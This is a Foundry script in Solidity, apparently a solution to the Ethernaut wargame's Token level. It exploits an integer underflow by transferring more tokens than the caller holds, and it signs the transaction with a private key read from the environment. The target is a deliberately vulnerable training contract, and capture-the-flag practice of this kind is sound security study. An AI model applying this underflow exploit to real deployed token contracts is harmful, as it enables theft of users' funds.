// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import {Token} from "src/05/Token.sol";

contract Exploit is Script {

        address instance = vm.envAddress("INSTANCE_LEVEL5");
        Token level = Token(instance);        
        
        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

            level.transfer(address(0), 21);
            
            vm.stopBroadcast();
    }
}
